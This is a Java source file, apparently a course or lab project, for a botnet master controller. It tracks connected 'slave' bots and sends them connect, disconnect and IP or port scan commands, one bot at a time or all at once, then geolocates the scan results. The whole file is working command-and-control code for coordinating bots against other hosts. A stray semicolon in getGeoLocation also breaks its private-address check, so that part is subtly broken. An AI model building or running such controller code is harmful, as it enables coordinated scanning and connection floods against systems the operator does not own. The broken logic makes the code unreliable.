/*
@Author:Pankaj Mohapatra

This class initialize a thread which keeps listening to the port for any new connection and passes messages to respective slave bots

*/


import java.io.*;
import java.net.*;
import java.util.*;
import java.lang.*;

public class MasterBotThreadInitializer extends Thread {
    
    int port;
    boolean listening = true;
    String fromSlave=new String();
    ArrayList<Socket> slavesSocketList = new ArrayList<>(); //maintain slave sockets list
    ArrayList<Integer> busyStat = new ArrayList<>();
    ArrayList<String> slavesDetails = new ArrayList<>();//Maintain slave info list
    boolean ackFlag=false;
    
    //Dehault constructor
    public MasterBotThreadInitializer(){
        
    }
    //Constructor which initializes the port on which master listens.
    public MasterBotThreadInitializer(int port){
        this.port=port;      
    }
    
    @Override
    
    public void run () {
        try(ServerSocket serverSocket = new ServerSocket(port))//creates server socket
        {   
            //Keeps listening on server port
            while (listening) {
                 Socket clientSocket = serverSocket.accept();
                 
                 //adds the socket to socket list as soon as a connection is established
                 slavesSocketList.add(clientSocket);
                 busyStat.add(0);
                 BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                 
                 //read the input streams for slave details.
                 while ((fromSlave = in.readLine()) != null){
                     if(fromSlave.equals("over"))
                         break;
                     slavesDetails.add(fromSlave);
                 }
            }            
        }catch(IOException e){System.out.println(e);}
    }
    
    //method to list all the slaves
    
     public void list(){
         Socket sock;
         int size=slavesDetails.size();
         try{
            for(int i=0;i<size;i++){
                sock=slavesSocketList.get(i);
                if(this.pulseCheck(sock,busyStat.get(i))==0){
                slavesSocketList.remove(i);
                busyStat.remove(i);
                slavesDetails.remove(i);
                i--;
                size--;
                }
            }
         }catch(Exception e){System.out.println(e);}
         if(slavesDetails.isEmpty()){
             System.out.println("No slaves connected");
         }
        for(String so : slavesDetails){
            System.out.println(so);
        }
    }
     
     //method to send connect and disconnect messeges to slaves
     
     public void message(String argument){
        int i=0;
        String buffer;
        String SlaveHostName="";
        StringTokenizer st = new StringTokenizer(argument);
        while (st.hasMoreTokens()) {
            i++;
            buffer=st.nextToken();
            switch(i){
                case 2: SlaveHostName=buffer; break;
                default : break;
            }

        }
        
        //in case of all
        if(SlaveHostName.equals("all")){
            Socket sock;
            int size=slavesSocketList.size();
            for(int j=0;j<size;j++){
                sock=slavesSocketList.get(j);
                if(this.pulseCheck(sock,busyStat.get(j))==0){
                    System.out.println(sock.getInetAddress().toString()+" is not available....List refreshed");
                    slavesSocketList.remove(j);
                    busyStat.remove(j);
                    slavesDetails.remove(j);
                    j--;
                    size--;
                }
            }
            try{
                for(i=0;i<slavesSocketList.size();i++){
                    PrintWriter out = new PrintWriter(slavesSocketList.get(i).getOutputStream(), true);
                    out.println(argument);
                }
            }catch(IOException e){System.out.println(e);}
        }
        
        //in case of specific slave
        else{
            for(i=0;i<slavesDetails.size();i++){
                buffer=slavesDetails.get(i);
                if(buffer.contains(SlaveHostName))
                break;
            }
            try{
                if(this.pulseCheck(slavesSocketList.get(i),busyStat.get(i))==1){
                    PrintWriter out = new PrintWriter(slavesSocketList.get(i).getOutputStream(), true);
                    out.println(argument);
                }
                else{
                    System.out.println(slavesSocketList.get(i).getInetAddress().toString()+" not available...List refreshed");
                    slavesSocketList.remove(i);
                    busyStat.remove(i);
                    slavesDetails.remove(i);
                }
            }catch(IOException e){System.out.println(e);}
        }
        
     }
     
     //Method for ICMP echo service
     
     public void portAndIPscan(String argument){
        //ArrayList<String> ipscanResult=new ArrayList<String>();
        new Thread(new Runnable() {
            @Override
            public void run() {
                int geoLoc=0;
                MasterBotThreadInitializer mb=new MasterBotThreadInitializer();
                if(argument.contains("geoipscan"))
                    geoLoc=1;
                String ipscanInfo=new String();
                int i=0;
                String buffer;
                String SlaveHostName="";
                StringTokenizer st = new StringTokenizer(argument);
                while (st.hasMoreTokens()) {
                    i++;
                    buffer=st.nextToken();
                    switch(i){
                        case 2: SlaveHostName=buffer; break;
                        default : break;
                    }
                    
                }      
                //in case of all
                if (SlaveHostName.equals("all")) {
                    Socket sock;
                    int size=slavesSocketList.size();
                    try {
                        for (i=0; i<slavesSocketList.size(); i++) {
                            //ArrayList<String> ipscanResult=new ArrayList<>();
                            PrintWriter out = new PrintWriter(slavesSocketList.get(i).getOutputStream(), true);
                            out.println(argument);
                            synchronized (MasterBotThreadInitializer.this) {
                                busyStat.set(i, busyStat.get(i)+1);
                            }
                            BufferedReader in = new BufferedReader(new InputStreamReader(slavesSocketList.get(i).getInputStream()));
                            while ((ipscanInfo = in.readLine()) != null){
                                if(ipscanInfo.equals("over2")){
                                    System.out.println(" scanning done...");
                                    break;
                                }
                                
                                else if(ipscanInfo.equals("ack"))
                                    ackFlag=true;
                                
                                else{
                                    System.out.print(ipscanInfo);
                                    if(geoLoc==1)
                                        mb.getGeoLocation(ipscanInfo);
                                }
                            }
                            synchronized (MasterBotThreadInitializer.this) {
                                busyStat.set(i,busyStat.get(i)-1);
                            }  
                            System.out.println();
                        }
                    }catch(IOException e){System.out.println(e);busyStat.set(i, busyStat.get(i)-1);} 
                    
                } 
                
                else if (SlaveHostName.equals("")) {
                    System.out.println("invalid slavehostname");
                } 
                
                //individual slaves
                else {
                    for(i=0;i<slavesDetails.size();i++){
                        buffer=slavesDetails.get(i);
                        if(buffer.contains(SlaveHostName))
                            break;
                    }       
                    try {
                       
                        PrintWriter out = new PrintWriter(slavesSocketList.get(i).getOutputStream(), true);
                        out.println(argument);
                        busyStat.set(i, busyStat.get(i)+1);
                        BufferedReader in = new BufferedReader(new InputStreamReader(slavesSocketList.get(i).getInputStream()));
                        while ((ipscanInfo = in.readLine()) != null){
                            if(ipscanInfo.equals("over2")){
                                System.out.println(" scanning done...");
                                break;
                            }
                                
                            else if(ipscanInfo.equals("ack")){
                                ackFlag=true;
                            }
                            else{
                                System.out.print(ipscanInfo);
                                if(geoLoc==1)
                                  mb.getGeoLocation(ipscanInfo);
                            }
                              
                        }
                        busyStat.set(i, busyStat.get(i)-1);
                       
                    }catch(IOException e){System.out.println(e);}
                }
        }
        }).start(); 

     }
     
     public void getGeoLocation(String argument){
         String ip="";
         try{
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            ip = in.readLine(); //you get your own the IP as a String
         }catch(Exception e){System.out.println(e);} 
         
         String ipList[];
         ipList=argument.split(",");
         GeoLocation obj = new GeoLocation();
         String tot="";
         for(String s:ipList){
             s=s.trim();
             if(s.matches("192*.+")||s.matches("10*.+"));
                s=ip;
             String location = obj.getLocation(s);
             tot=tot+s+" :  "+location+"\n";
         }
        System.out.println();
        System.out.println("GeoIpLocations");
        System.out.println(tot);
     }
     
     //method to check if the slaves are connected
     
     public int pulseCheck(Socket sock, Integer i){
         String inputLine;
         try{
            if(i>0)
                return 1;
            else{
            PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
            BufferedReader in2 = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            out.println("test");
            inputLine=in2.readLine();
            //System.out.println(inputLine);
            if(inputLine.equals("ack"))
              return 1;
            else
              return 0;  
            }
         }
         catch(Exception e){return 0;}
     }
}
